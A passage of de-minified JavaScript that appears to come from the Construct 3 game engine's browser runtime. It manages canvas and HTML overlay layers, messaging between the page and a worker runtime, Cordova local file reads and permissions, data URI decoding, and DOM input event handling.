      for (const { canvas: canvas, htmlWrap: htmlWrap } of this._canvasLayers)
        (canvas.style.width = widthPx),
          (canvas.style.height = heightPx),
          (canvas.style.marginLeft = leftPx),
          (canvas.style.marginTop = topPx),
          (htmlWrap.style.width = widthPx),
          (htmlWrap.style.height = heightPx),
          (htmlWrap.style.marginLeft = leftPx),
          (htmlWrap.style.marginTop = topPx),
          this._isFirstSizeUpdate &&
            ((canvas.style.display = ''), (htmlWrap.style.display = ''));
      document.documentElement.style.setProperty(
        '--construct-scale',
        e.displayScale
      ),
        (this._isFirstSizeUpdate = !1);
    }
    _OnSetHTMLLayerCount(e) {
      const count = e.count,
        immediate = e.immediate,
        widthPx = e.styleWidth + 'px',
        heightPx = e.styleHeight + 'px',
        leftPx = e.marginLeft + 'px',
        topPx = e.marginTop + 'px',
        addedCanvases = [],
        transferables = [];
      if (count < this._canvasLayers.length)
        for (; this._canvasLayers.length > count; ) {
          const { canvas: canvas, htmlWrap: htmlWrap } =
            this._canvasLayers.pop();
          htmlWrap.remove(),
            this._useWorker && !immediate
              ? this._pendingRemoveElements.push(canvas)
              : canvas.remove();
        }
      else if (count > this._canvasLayers.length)
        for (let i = 0, len = count - this._canvasLayers.length; i < len; ++i) {
          const canvas = document.createElement('canvas');
          if ((canvas.classList.add('c3overlay'), this._useWorker)) {
            const offscreenCanvas = canvas.transferControlToOffscreen();
            addedCanvases.push(offscreenCanvas),
              transferables.push(offscreenCanvas);
          } else addedCanvases.push(canvas);
          document.body.appendChild(canvas);
          const htmlWrap = document.createElement('div');
          htmlWrap.classList.add('c3htmlwrap', 'c3overlay'),
            document.body.appendChild(htmlWrap),
            (canvas.style.width = widthPx),
            (canvas.style.height = heightPx),
            (canvas.style.marginLeft = leftPx),
            (canvas.style.marginTop = topPx),
            (htmlWrap.style.width = widthPx),
            (htmlWrap.style.height = heightPx),
            (htmlWrap.style.marginLeft = leftPx),
            (htmlWrap.style.marginTop = topPx),
            this._runtimeDomHandler._AddDefaultCanvasEventHandlers(canvas),
            this._runtimeDomHandler._AddDefaultHTMLWrapEventHandlers(htmlWrap),
            this._canvasLayers.push({ canvas: canvas, htmlWrap: htmlWrap });
        }
      for (const domHandler of this._domHandlers)
        domHandler instanceof window.DOMElementHandler &&
          domHandler._OnHTMLLayersChanged();
      return (
        this._UpdateHTMLElementsZOrder(),
        { addedCanvases: addedCanvases, transferables: transferables }
      );
    }
    _OnCleanUpHTMLLayers() {
      for (const elem of this._pendingRemoveElements) elem.remove();
      this._pendingRemoveElements.length = 0;
    }
    _UpdateHTMLElementsZOrder() {
      this._pendingUpdateHTMLZOrder ||
        ((this._pendingUpdateHTMLZOrder = !0),
        this._AddRAFCallback(this._updateHTMLZOrderRAFCallback));
    }
    _DoUpdateHTMLElementsZOrder() {
      this._RemoveRAFCallback(this._updateHTMLZOrderRAFCallback),
        (this._pendingUpdateHTMLZOrder = !1);
      let allElementStates = [];
      for (const domHandler of this._domHandlers)
        if (domHandler instanceof window.DOMElementHandler) {
          const elemStates = domHandler._GetAllElementStatesForZOrderUpdate();
          elemStates && allElementStates.push(...elemStates);
        }
      allElementStates.sort((a, b) => {
        const a1 = a.GetActualHTMLIndex(),
          b1 = b.GetActualHTMLIndex();
        if (a1 !== b1) return a1 - b1;
        return a.GetHTMLZIndex() - b.GetHTMLZIndex();
      });
      let curHtmlIndex = 0,
        s = 0,
        i = 0,
        len = allElementStates.length;
      for (; i < len; ++i) {
        const es = allElementStates[i];
        es.GetActualHTMLIndex() !== curHtmlIndex &&
          (this._DoUpdateHTMLElementsZOrderOnHTMLLayer(
            curHtmlIndex,
            allElementStates.slice(s, i)
          ),
          (curHtmlIndex = es.GetActualHTMLIndex()),
          (s = i));
      }
      s < i &&
        this._DoUpdateHTMLElementsZOrderOnHTMLLayer(
          curHtmlIndex,
          allElementStates.slice(s, i)
        );
    }
    _DoUpdateHTMLElementsZOrderOnHTMLLayer(htmlIndex, arr) {
      if (arr.length <= 1) return;
      if (htmlIndex >= this._canvasLayers.length) return;
      const newChildren = arr.map((es) => es.GetElement()),
        newChildrenSet = new Set(newChildren),
        htmlWrap = this.GetHTMLWrapElement(htmlIndex),
        existingChildren = Array.from(htmlWrap.children).filter((elem) =>
          newChildrenSet.has(elem)
        );
      let i = 0,
        len = Math.min(newChildren.length, existingChildren.length);
      for (; i < len && newChildren[i] === existingChildren[i]; ++i);
      let j = i;
      for (; j < len; ++j) existingChildren[j].remove();
      for (j = i; j < len; ++j) htmlWrap.appendChild(newChildren[j]);
    }
    _GetLocalRuntime() {
      if (this._useWorker) throw new Error('not available in worker mode');
      return this._localRuntime;
    }
    PostToRuntimeComponent(
      component,
      handler,
      data,
      dispatchOpts,
      transferables
    ) {
      this._messageChannelPort.postMessage(
        {
          type: 'event',
          component: component,
          handler: handler,
          dispatchOpts: dispatchOpts || null,
          data: data,
          responseId: null,
        },
        transferables
      );
    }
    PostToRuntimeComponentAsync(
      component,
      handler,
      data,
      dispatchOpts,
      transferables
    ) {
      const responseId = nextResponseId++,
        ret = new Promise((resolve, reject) => {
          pendingResponsePromises.set(responseId, {
            resolve: resolve,
            reject: reject,
          });
        });
      return (
        this._messageChannelPort.postMessage(
          {
            type: 'event',
            component: component,
            handler: handler,
            dispatchOpts: dispatchOpts || null,
            data: data,
            responseId: responseId,
          },
          transferables
        ),
        ret
      );
    }
    _OnMessageFromRuntime(data) {
      const type = data.type;
      if ('event' === type) return this._OnEventFromRuntime(data);
      if ('result' === type) this._OnResultFromRuntime(data);
      else if ('runtime-ready' === type) this._OnRuntimeReady();
      else if ('alert-error' === type)
        this._RemoveLoadingMessage(), alert(data.message);
      else {
        if ('creating-runtime' !== type)
          throw new Error(`unknown message '${type}'`);
        this._OnBeforeCreateRuntime();
      }
    }
    _OnEventFromRuntime(e) {
      const component = e.component,
        handler = e.handler,
        data = e.data,
        responseId = e.responseId,
        handlerMap = runtimeEventHandlers.get(component);
      if (!handlerMap)
        return void console.warn(
          `[DOM] No event handlers for component '${component}'`
        );
      const func = handlerMap.get(handler);
      if (!func)
        return void console.warn(
          `[DOM] No handler '${handler}' for component '${component}'`
        );
      let ret = null;
      try {
        ret = func(data);
      } catch (err) {
        return (
          console.error(
            `Exception in '${component}' handler '${handler}':`,
            err
          ),
          void (
            null !== responseId &&
            this._PostResultToRuntime(responseId, !1, '' + err)
          )
        );
      }
      if (null === responseId) return ret;
      ret && ret.then
        ? ret
            .then((result) => this._PostResultToRuntime(responseId, !0, result))
            .catch((err) => {
              console.error(
                `Rejection from '${component}' handler '${handler}':`,
                err
              ),
                this._PostResultToRuntime(responseId, !1, '' + err);
            })
        : this._PostResultToRuntime(responseId, !0, ret);
    }
    _PostResultToRuntime(responseId, isOk, result) {
      let transferables;
      result && result.transferables && (transferables = result.transferables),
        this._messageChannelPort.postMessage(
          {
            type: 'result',
            responseId: responseId,
            isOk: isOk,
            result: result,
          },
          transferables
        );
    }
    _OnResultFromRuntime(data) {
      const responseId = data.responseId,
        isOk = data.isOk,
        result = data.result,
        pendingPromise = pendingResponsePromises.get(responseId);
      isOk ? pendingPromise.resolve(result) : pendingPromise.reject(result),
        pendingResponsePromises.delete(responseId);
    }
    AddRuntimeComponentMessageHandler(component, handler, func) {
      let handlerMap = runtimeEventHandlers.get(component);
      if (
        (handlerMap ||
          ((handlerMap = new Map()),
          runtimeEventHandlers.set(component, handlerMap)),
        handlerMap.has(handler))
      )
        throw new Error(
          `[DOM] Component '${component}' already has handler '${handler}'`
        );
      handlerMap.set(handler, func);
    }
    static AddDOMHandlerClass(Class) {
      if (domHandlerClasses.includes(Class))
        throw new Error('DOM handler already added');
      domHandlerClasses.push(Class);
    }
    _FindRuntimeDOMHandler() {
      for (const dh of this._domHandlers)
        if ('runtime' === dh.GetComponentID())
          return void (this._runtimeDomHandler = dh);
      throw new Error('cannot find runtime DOM handler');
    }
    _OnMessageFromDebugger(e) {
      this.PostToRuntimeComponent('debugger', 'message', e);
    }
    _OnRuntimeReady() {
      for (const h of this._domHandlers) h.Attach();
    }
    static IsDocumentFullscreen() {
      return !!(
        document.fullscreenElement ||
        document.webkitFullscreenElement ||
        document.mozFullScreenElement ||
        isWrapperFullscreen
      );
    }
    static _SetWrapperIsFullscreenFlag(f) {
      isWrapperFullscreen = !!f;
    }
    async GetRemotePreviewStatusInfo() {
      return await this.PostToRuntimeComponentAsync(
        'runtime',
        'get-remote-preview-status-info'
      );
    }
    _AddRAFCallback(f) {
      this._rafCallbacks.add(f), this._RequestAnimationFrame();
    }
    _RemoveRAFCallback(f) {
      this._rafCallbacks.delete(f),
        0 === this._rafCallbacks.size && this._CancelAnimationFrame();
    }
    _RequestAnimationFrame() {
      -1 === this._rafId &&
        this._rafCallbacks.size > 0 &&
        (this._rafId = requestAnimationFrame(this._rafFunc));
    }
    _CancelAnimationFrame() {
      -1 !== this._rafId &&
        (cancelAnimationFrame(this._rafId), (this._rafId = -1));
    }
    _OnRAFCallback() {
      this._rafId = -1;
      for (const f of this._rafCallbacks) f();
      this._RequestAnimationFrame();
    }
    TryPlayMedia(mediaElem) {
      this._runtimeDomHandler.TryPlayMedia(mediaElem);
    }
    RemovePendingPlay(mediaElem) {
      this._runtimeDomHandler.RemovePendingPlay(mediaElem);
    }
    _PlayPendingMedia() {
      this._runtimeDomHandler._PlayPendingMedia();
    }
    SetSilent(s) {
      this._runtimeDomHandler.SetSilent(s);
    }
    IsAudioFormatSupported(typeStr) {
      return !!supportedAudioFormats[typeStr];
    }
    async _WasmDecodeWebMOpus(arrayBuffer) {
      const result = await this.PostToRuntimeComponentAsync(
        'runtime',
        'opus-decode',
        { arrayBuffer: arrayBuffer },
        null,
        [arrayBuffer]
      );
      return new Float32Array(result);
    }
    SetIsExportingToVideo(duration) {
      (this._isExportingToVideo = !0), (this._exportToVideoDuration = duration);
    }
    IsExportingToVideo() {
      return this._isExportingToVideo;
    }
    GetExportToVideoDuration() {
      return this._exportToVideoDuration;
    }
    IsAbsoluteURL(url) {
      return (
        /^(?:[a-z\-]+:)?\/\//.test(url) ||
        'data:' === url.substr(0, 5) ||
        'blob:' === url.substr(0, 5)
      );
    }
    IsRelativeURL(url) {
      return !this.IsAbsoluteURL(url);
    }
    async _MaybeGetCordovaScriptURL(url) {
      if (
        'cordova' === this._exportType &&
        (url.startsWith('file:') ||
          (this._isFileProtocol && this.IsRelativeURL(url)))
      ) {
        let filename = url;
        filename.startsWith(this._runtimeBaseUrl) &&
          (filename = filename.substr(this._runtimeBaseUrl.length));
        const arrayBuffer = await this.CordovaFetchLocalFileAsArrayBuffer(
            filename
          ),
          blob = new Blob([arrayBuffer], { type: 'application/javascript' });
        return URL.createObjectURL(blob);
      }
      return url;
    }
    async _OnCordovaFetchLocalFile(e) {
      const filename = e.filename;
      switch (e.as) {
        case 'text':
          return await this.CordovaFetchLocalFileAsText(filename);
        case 'buffer':
          return await this.CordovaFetchLocalFileAsArrayBuffer(filename);
        default:
          throw new Error('unsupported type');
      }
    }
    _GetPermissionAPI() {
      const api =
        window.cordova &&
        window.cordova.plugins &&
        window.cordova.plugins.permissions;
      if ('object' != typeof api)
        throw new Error('Permission API is not loaded');
      return api;
    }
    _MapPermissionID(api, permission) {
      const permissionID = api[permission];
      if ('string' != typeof permissionID)
        throw new Error('Invalid permission name');
      return permissionID;
    }
    _HasPermission(id) {
      const api = this._GetPermissionAPI();
      return new Promise((resolve, reject) =>
        api.checkPermission(
          this._MapPermissionID(api, id),
          (status) => resolve(!!status.hasPermission),
          reject
        )
      );
    }
    _RequestPermission(id) {
      const api = this._GetPermissionAPI();
      return new Promise((resolve, reject) =>
        api.requestPermission(
          this._MapPermissionID(api, id),
          (status) => resolve(!!status.hasPermission),
          reject
        )
      );
    }
    async RequestPermissions(permissions) {
      if ('cordova' !== this.GetExportType()) return !0;
      if (this.IsiOSCordova()) return !0;
      for (const id of permissions) {
        if (await this._HasPermission(id)) continue;
        if (!1 === (await this._RequestPermission(id))) return !1;
      }
      return !0;
    }
    async RequirePermissions(...permissions) {
      if (!1 === (await this.RequestPermissions(permissions)))
        throw new Error('Permission not granted');
    }
    CordovaFetchLocalFile(filename) {
      const path = window.cordova.file.applicationDirectory + 'www/' + filename;
      return new Promise((resolve, reject) => {
        window.resolveLocalFileSystemURL(
          path,
          (entry) => {
            entry.file(resolve, reject);
          },
          reject
        );
      });
    }
    async CordovaFetchLocalFileAsText(filename) {
      const file = await this.CordovaFetchLocalFile(filename);
      return await BlobToString(file);
    }
    _CordovaMaybeStartNextArrayBufferRead() {
      if (!queuedArrayBufferReads.length) return;
      if (activeArrayBufferReads >= MAX_ARRAYBUFFER_READS) return;
      activeArrayBufferReads++;
      const job = queuedArrayBufferReads.shift();
      this._CordovaDoFetchLocalFileAsAsArrayBuffer(
        job.filename,
        job.successCallback,
        job.errorCallback
      );
    }
    CordovaFetchLocalFileAsArrayBuffer(filename) {
      return new Promise((resolve, reject) => {
        queuedArrayBufferReads.push({
          filename: filename,
          successCallback: (result) => {
            activeArrayBufferReads--,
              this._CordovaMaybeStartNextArrayBufferRead(),
              resolve(result);
          },
          errorCallback: (err) => {
            activeArrayBufferReads--,
              this._CordovaMaybeStartNextArrayBufferRead(),
              reject(err);
          },
        }),
          this._CordovaMaybeStartNextArrayBufferRead();
      });
    }
    async _CordovaDoFetchLocalFileAsAsArrayBuffer(
      filename,
      successCallback,
      errorCallback
    ) {
      try {
        const file = await this.CordovaFetchLocalFile(filename);
        successCallback(await BlobToArrayBuffer(file));
      } catch (err) {
        errorCallback(err);
      }
    }
    _OnWrapperMessage(msg) {
      if ('entered-fullscreen' === msg)
        RuntimeInterface._SetWrapperIsFullscreenFlag(!0),
          this._runtimeDomHandler._OnFullscreenChange();
      else if ('exited-fullscreen' === msg)
        RuntimeInterface._SetWrapperIsFullscreenFlag(!1),
          this._runtimeDomHandler._OnFullscreenChange();
      else if ('object' == typeof msg) {
        const type = msg.type;
        'wrapper-init-response' === type
          ? (this._wrapperInitResolve(msg), (this._wrapperInitResolve = null))
          : 'extension-message' === type
          ? this.PostToRuntimeComponent(
              'runtime',
              'wrapper-extension-message',
              msg
            )
          : console.warn('Unknown wrapper message: ', msg);
      } else console.warn('Unknown wrapper message: ', msg);
    }
    _OnSendWrapperExtensionMessage(data) {
      this._SendWrapperMessage({
        type: 'extension-message',
        componentId: data.componentId,
        messageId: data.messageId,
        params: data.params || [],
        asyncId: data.asyncId,
      });
    }
    _SendWrapperMessage(o) {
      this.IsAnyWebView2Wrapper()
        ? window.chrome.webview.postMessage(JSON.stringify(o))
        : 'macos-wkwebview' === this._exportType &&
          window.webkit.messageHandlers.C3Wrapper.postMessage(
            JSON.stringify(o)
          );
    }
    _SetupWebView2Polyfills() {
      (window.moveTo = (x, y) => {
        this._SendWrapperMessage({
          type: 'set-window-position',
          windowX: Math.ceil(x),
          windowY: Math.ceil(y),
        });
      }),
        (window.resizeTo = (w, h) => {
          this._SendWrapperMessage({
            type: 'set-window-size',
            windowWidth: Math.ceil(w),
            windowHeight: Math.ceil(h),
          });
        });
    }
    _InitWrapper() {
      return this.IsAnyWebView2Wrapper()
        ? new Promise((resolve) => {
            (this._wrapperInitResolve = resolve),
              this._SendWrapperMessage({ type: 'wrapper-init' });
          })
        : Promise.resolve();
    }
    async _ConvertDataUrisToBlobs() {
      const promises = [];
      for (const [filename, data] of Object.entries(this._localFileBlobs))
        promises.push(this._ConvertDataUriToBlobs(filename, data));
      await Promise.all(promises);
    }
    async _ConvertDataUriToBlobs(filename, data) {
      if ('object' == typeof data)
        (this._localFileBlobs[filename] = new Blob([data.str], {
          type: data.type,
        })),
          (this._localFileStrings[filename] = data.str);
      else {
        let blob = await this._FetchDataUri(data);
        blob || (blob = this._DataURIToBinaryBlobSync(data)),
          (this._localFileBlobs[filename] = blob);
      }
    }
    async _FetchDataUri(dataUri) {
      try {
        const response = await fetch(dataUri);
        return await response.blob();
      } catch (err) {
        return (
          console.warn(
            'Failed to fetch a data: URI. Falling back to a slower workaround. This is probably because the Content Security Policy unnecessarily blocked it. Allow data: URIs in your CSP to avoid this.',
            err
          ),
          null
        );
      }
    }
    _DataURIToBinaryBlobSync(datauri) {
      const o = this._ParseDataURI(datauri);
      return this._BinaryStringToBlob(o.data, o.mime_type);
    }
    _ParseDataURI(datauri) {
      const comma = datauri.indexOf(',');
      if (comma < 0) throw new URIError('expected comma in data: uri');
      const typepart = datauri.substring(5, comma),
        datapart = datauri.substring(comma + 1),
        typearr = typepart.split(';'),
        mimetype = typearr[0] || '',
        encoding1 = typearr[1],
        encoding2 = typearr[2];
      let decodeddata;
      return (
        (decodeddata =
          'base64' === encoding1 || 'base64' === encoding2
            ? atob(datapart)
            : decodeURIComponent(datapart)),
        { mime_type: mimetype, data: decodeddata }
      );
    }
    _BinaryStringToBlob(binstr, mime_type) {
      let i,
        j,
        len = binstr.length,
        len32 = len >> 2,
        a8 = new Uint8Array(len),
        a32 = new Uint32Array(a8.buffer, 0, len32);
      for (i = 0, j = 0; i < len32; ++i)
        a32[i] =
          binstr.charCodeAt(j++) |
          (binstr.charCodeAt(j++) << 8) |
          (binstr.charCodeAt(j++) << 16) |
          (binstr.charCodeAt(j++) << 24);
      let tailLength = 3 & len;
      for (; tailLength--; ) (a8[j] = binstr.charCodeAt(j)), ++j;
      return new Blob([a8], { type: mime_type });
    }
  };
}
{
  const RuntimeInterface = self.RuntimeInterface;
  function IsCompatibilityMouseEvent(e) {
    return (
      (e.sourceCapabilities && e.sourceCapabilities.firesTouchEvents) ||
      (e.originalEvent &&
        e.originalEvent.sourceCapabilities &&
        e.originalEvent.sourceCapabilities.firesTouchEvents)
    );
  }
  const KEY_CODE_ALIASES = new Map([
      ['OSLeft', 'MetaLeft'],
      ['OSRight', 'MetaRight'],
    ]),
    DISPATCH_RUNTIME_AND_SCRIPT = {
      dispatchRuntimeEvent: !0,
      dispatchUserScriptEvent: !0,
    },
    DISPATCH_SCRIPT_ONLY = { dispatchUserScriptEvent: !0 },
    DISPATCH_RUNTIME_ONLY = { dispatchRuntimeEvent: !0 };
  async function BlobToImage(blob) {
    const blobUrl = URL.createObjectURL(blob);
    try {
      return await ((url = blobUrl),
      new Promise((resolve, reject) => {
        const img = new Image();
        (img.onload = () => resolve(img)),
          (img.onerror = (err) => reject(err)),
          (img.src = url);
      }));
    } finally {
      URL.revokeObjectURL(blobUrl);
    }
    var url;
  }
  function IsInContentEditable(el) {
    do {
      if (el.parentNode && el.hasAttribute('contenteditable')) return !0;
      el = el.parentNode;
    } while (el);
    return !1;
  }
  const keyboardInputElementTagNames = new Set([
    'input',
    'textarea',
    'datalist',
    'select',
  ]);
  const canvasOrDocTags = new Set(['canvas', 'body', 'html']);
  function PreventDefaultOnCanvasOrDoc(e) {
    if (!e.target.tagName) return;
    const tagName = e.target.tagName.toLowerCase();
    canvasOrDocTags.has(tagName) && e.preventDefault();
  }
  function PreventDefaultOnHTMLWrap(e) {
    e.target.tagName &&
      e.target.classList.contains('c3htmlwrap') &&
      e.preventDefault();
  }
  function BlockWheelZoom(e) {
    (e.metaKey || e.ctrlKey) && e.preventDefault();
  }
  (self.C3_GetSvgImageSize = async function (blob) {
    const img = await BlobToImage(blob);
    if (img.width > 0 && img.height > 0) return [img.width, img.height];
    {
      (img.style.position = 'absolute'),
        (img.style.left = '0px'),
        (img.style.top = '0px'),
        (img.style.visibility = 'hidden'),
        document.body.appendChild(img);
      const rc = img.getBoundingClientRect();
      return document.body.removeChild(img), [rc.width, rc.height];
    }
  }),
    (self.C3_RasterSvgImageBlob = async function (
      blob,
      imageWidth,
      imageHeight,
      surfaceWidth,
      surfaceHeight
    ) {
      const img = await BlobToImage(blob),
        canvas = document.createElement('canvas');
      (canvas.width = surfaceWidth), (canvas.height = surfaceHeight);
      return (
        canvas.getContext('2d').drawImage(img, 0, 0, imageWidth, imageHeight),
        canvas
      );
    });
  let isCordovaPaused = !1;
  function ParentHasFocus() {
    try {
      return window.parent && window.parent.document.hasFocus();
    } catch (err) {
      return !1;
    }
  }
  document.addEventListener('pause', () => (isCordovaPaused = !0)),
    document.addEventListener('resume', () => (isCordovaPaused = !1));
  const DOM_COMPONENT_ID = 'runtime',
    HANDLER_CLASS = class RuntimeDOMHandler extends self.DOMHandler {
      constructor(iRuntime) {
        super(iRuntime, DOM_COMPONENT_ID),
          (this._enableWindowResizeEvent = !1),
          (this._simulatedResizeTimerId = -1),
          (this._targetOrientation = 'any'),
          (this._attachedDeviceOrientationEvent = !1),
          (this._attachedDeviceMotionEvent = !1),
          (this._pageVisibilityIsHidden = !1),
          (this._screenReaderTextWrap = document.createElement('div')),
          (this._screenReaderTextWrap.className = 'c3-screen-reader-text'),
          this._screenReaderTextWrap.setAttribute('aria-live', 'polite'),
          document.body.appendChild(this._screenReaderTextWrap),
          (this._debugHighlightElem = null),
          (this._isExportToVideo = !1),
          (this._exportVideoProgressMessage = ''),
          (this._exportVideoUpdateTimerId = -1),
          (this._enableAndroidVKDetection = !1),
          (this._lastWindowWidth = iRuntime._GetWindowInnerWidth()),
          (this._lastWindowHeight = iRuntime._GetWindowInnerHeight()),
          (this._virtualKeyboardHeight = 0),
          (this._vkTranslateYOffset = 0),
          iRuntime.AddRuntimeComponentMessageHandler(
            'runtime',
            'invoke-download',
            (e) => this._OnInvokeDownload(e)
          ),
          iRuntime.AddRuntimeComponentMessageHandler(
            'runtime',
            'load-webfonts',
            (e) => this._OnLoadWebFonts(e)
          ),
          iRuntime.AddRuntimeComponentMessageHandler(
            'runtime',
            'raster-svg-image',
            (e) => this._OnRasterSvgImage(e)
          ),
          iRuntime.AddRuntimeComponentMessageHandler(
            'runtime',
            'get-svg-image-size',
            (e) => this._OnGetSvgImageSize(e)
          ),
          iRuntime.AddRuntimeComponentMessageHandler(
            'runtime',
            'set-target-orientation',
            (e) => this._OnSetTargetOrientation(e)
          ),
          iRuntime.AddRuntimeComponentMessageHandler(
            'runtime',
            'register-sw',
            () => this._OnRegisterSW()
          ),
          iRuntime.AddRuntimeComponentMessageHandler(
            'runtime',
            'post-to-debugger',
            (e) => this._OnPostToDebugger(e)
          ),
          iRuntime.AddRuntimeComponentMessageHandler(
            'runtime',
            'go-to-script',
            (e) => this._OnPostToDebugger(e)
          ),
          iRuntime.AddRuntimeComponentMessageHandler(
            'runtime',
            'before-start-ticking',
            () => this._OnBeforeStartTicking()
          ),
          iRuntime.AddRuntimeComponentMessageHandler(
            'runtime',
            'debug-highlight',
            (e) => this._OnDebugHighlight(e)
          ),
          iRuntime.AddRuntimeComponentMessageHandler(
            'runtime',
            'enable-device-orientation',
            () => this._AttachDeviceOrientationEvent()
          ),
          iRuntime.AddRuntimeComponentMessageHandler(
            'runtime',
            'enable-device-motion',
            () => this._AttachDeviceMotionEvent()
          ),
          iRuntime.AddRuntimeComponentMessageHandler(
            'runtime',
            'add-stylesheet',
            (e) => this._OnAddStylesheet(e)
          ),
          iRuntime.AddRuntimeComponentMessageHandler(
            'runtime',
            'script-create-worker',
            (e) => this._OnScriptCreateWorker(e)
          ),
          iRuntime.AddRuntimeComponentMessageHandler('runtime', 'alert', (e) =>
            this._OnAlert(e)
          ),
          iRuntime.AddRuntimeComponentMessageHandler(
            'runtime',
            'screen-reader-text',
            (e) => this._OnScreenReaderTextEvent(e)
          ),
          iRuntime.AddRuntimeComponentMessageHandler(
            'runtime',
            'hide-cordova-splash',
            () => this._OnHideCordovaSplash()
          ),
          iRuntime.AddRuntimeComponentMessageHandler(
            'runtime',
            'set-exporting-to-video',
            (e) => this._SetExportingToVideo(e)
          ),
          iRuntime.AddRuntimeComponentMessageHandler(
            'runtime',
            'export-to-video-progress',
            (e) => this._OnExportVideoProgress(e)
          ),
          iRuntime.AddRuntimeComponentMessageHandler(
            'runtime',
            'exported-to-video',
            (e) => this._OnExportedToVideo(e)
          ),
          iRuntime.AddRuntimeComponentMessageHandler(
            'runtime',
            'exported-to-image-sequence',
            (e) => this._OnExportedToImageSequence(e)
          );
        const allowDefaultContextMenuTagNames = new Set([
          'input',
          'textarea',
          'datalist',
        ]);
        if (
          (window.addEventListener('contextmenu', (e) => {
            const t = e.target,
              name = t.tagName.toLowerCase();
            allowDefaultContextMenuTagNames.has(name) ||
              IsInContentEditable(t) ||
              e.preventDefault();
          }),
          window.addEventListener('selectstart', PreventDefaultOnCanvasOrDoc),
          window.addEventListener('gesturehold', PreventDefaultOnCanvasOrDoc),
          window.addEventListener('touchstart', PreventDefaultOnCanvasOrDoc, {
            passive: !1,
          }),
          window.addEventListener('pointerdown', PreventDefaultOnCanvasOrDoc, {
            passive: !1,
          }),
          (this._mousePointerLastButtons = 0),
          window.addEventListener('mousedown', (e) => {
            1 === e.button && e.preventDefault();
          }),
          window.addEventListener('mousewheel', BlockWheelZoom, {
            passive: !1,
          }),
          window.addEventListener('wheel', BlockWheelZoom, { passive: !1 }),
          window.addEventListener('resize', () => this._OnWindowResize()),
          window.addEventListener('fullscreenchange', () =>
            this._OnFullscreenChange()
          ),
          window.addEventListener('webkitfullscreenchange', () =>
            this._OnFullscreenChange()
          ),
          window.addEventListener('mozfullscreenchange', () =>
            this._OnFullscreenChange()
          ),
          window.addEventListener('fullscreenerror', (e) =>
            this._OnFullscreenError(e)
          ),
          window.addEventListener('webkitfullscreenerror', (e) =>
            this._OnFullscreenError(e)
          ),
          window.addEventListener('mozfullscreenerror', (e) =>
            this._OnFullscreenError(e)
          ),
          iRuntime.IsiOSWebView())
        ) {
          let lastVisualViewportHeight = 1 / 0;
          window.visualViewport.addEventListener('resize', () => {
            const curVisualViewportHeight = window.visualViewport.height;
            curVisualViewportHeight > lastVisualViewportHeight &&
              ((document.scrollingElement.scrollTop = 0),
              (document.scrollingElement.scrollLeft = 0)),
              (lastVisualViewportHeight = curVisualViewportHeight);
          }),
            document.documentElement.setAttribute('ioswebview', '');
        }
        (this._mediaPendingPlay = new Set()),
          (this._mediaRemovedPendingPlay = new WeakSet()),
          (this._isSilent = !1);
      }
      _AddDefaultCanvasEventHandlers(canvas) {
        canvas.addEventListener('selectstart', PreventDefaultOnCanvasOrDoc),
          canvas.addEventListener('gesturehold', PreventDefaultOnCanvasOrDoc),
          canvas.addEventListener('pointerdown', PreventDefaultOnCanvasOrDoc);
      }
      _AddDefaultHTMLWrapEventHandlers(htmlwrap) {
        htmlwrap.addEventListener('selectstart', PreventDefaultOnHTMLWrap),
          htmlwrap.addEventListener('gesturehold', PreventDefaultOnHTMLWrap),
          htmlwrap.addEventListener('touchstart', PreventDefaultOnHTMLWrap);
      }
      _OnBeforeStartTicking() {
        return (
          self.setTimeout(() => {
            this._enableAndroidVKDetection = !0;
          }, 1e3),
          'cordova' === this._iRuntime.GetExportType()
            ? (document.addEventListener('pause', () =>
                this._OnVisibilityChange(!0)
              ),
              document.addEventListener('resume', () =>
                this._OnVisibilityChange(!1)
              ))
            : document.addEventListener('visibilitychange', () =>
                this._OnVisibilityChange('hidden' === document.visibilityState)
              ),
          (this._pageVisibilityIsHidden = !(
            'hidden' !== document.visibilityState && !isCordovaPaused
          )),
          { isSuspended: this._pageVisibilityIsHidden }
        );
      }
      Attach() {
        window.addEventListener('focus', () =>
          this._PostRuntimeEvent('window-focus')
        ),
          window.addEventListener('blur', () => {
            this._PostRuntimeEvent('window-blur', {
              parentHasFocus: ParentHasFocus(),
            }),
              (this._mousePointerLastButtons = 0);
          }),
          window.addEventListener('focusin', (e) => {
            var elem;
            (elem = e.target),
              (keyboardInputElementTagNames.has(elem.tagName.toLowerCase()) ||
                IsInContentEditable(elem)) &&
                this._PostRuntimeEvent('keyboard-blur');
          }),
          window.addEventListener('keydown', (e) =>
            this._OnKeyEvent('keydown', e)
          ),
          window.addEventListener('keyup', (e) => this._OnKeyEvent('keyup', e)),
          window.addEventListener('mousedown', (e) =>
            this._OnMouseEvent('mousedown', e, DISPATCH_SCRIPT_ONLY)
          ),
          window.addEventListener('mousemove', (e) =>
            this._OnMouseEvent('mousemove', e, DISPATCH_SCRIPT_ONLY)
          ),
          window.addEventListener('mouseup', (e) =>
            this._OnMouseEvent('mouseup', e, DISPATCH_SCRIPT_ONLY)
          ),
          window.addEventListener('dblclick', (e) =>
            this._OnMouseEvent('dblclick', e, DISPATCH_RUNTIME_AND_SCRIPT)
          ),
          window.addEventListener('wheel', (e) =>
            this._OnMouseWheelEvent('wheel', e, DISPATCH_RUNTIME_AND_SCRIPT)
          ),
          window.addEventListener('pointerdown', (e) => {
            this._HandlePointerDownFocus(e),
              this._OnPointerEvent('pointerdown', e);
          }),
          this._iRuntime.UsesWorker() &&
          void 0 !== window.onpointerrawupdate &&
          self === self.top
            ? window.addEventListener('pointerrawupdate', (e) =>
                this._OnPointerRawUpdate(e)
              )
            : window.addEventListener('pointermove', (e) =>
                this._OnPointerEvent('pointermove', e)
              ),
          window.addEventListener('pointerup', (e) =>
            this._OnPointerEvent('pointerup', e)
          ),
          window.addEventListener('pointercancel', (e) =>
            this._OnPointerEvent('pointercancel', e)
          );
        const playFunc = () => this._PlayPendingMedia();
        window.addEventListener('pointerup', playFunc, !0),
          window.addEventListener('touchend', playFunc, !0),
          window.addEventListener('click', playFunc, !0),
          window.addEventListener('keydown', playFunc, !0),
          window.addEventListener('gamepadconnected', playFunc, !0),
          this._iRuntime.IsAndroid() &&
            !this._iRuntime.IsAndroidWebView() &&
            navigator.virtualKeyboard &&
            ((navigator.virtualKeyboard.overlaysContent = !0),
            navigator.virtualKeyboard.addEventListener('geometrychange', () => {
              this._OnAndroidVirtualKeyboardChange(
                this._GetWindowInnerHeight(),
                navigator.virtualKeyboard.boundingRect.height
              );
            })),
          this._iRuntime.IsiOSWebView() &&
            ((document.scrollingElement.scrollTop = 0),
            (document.scrollingElement.scrollLeft = 0));
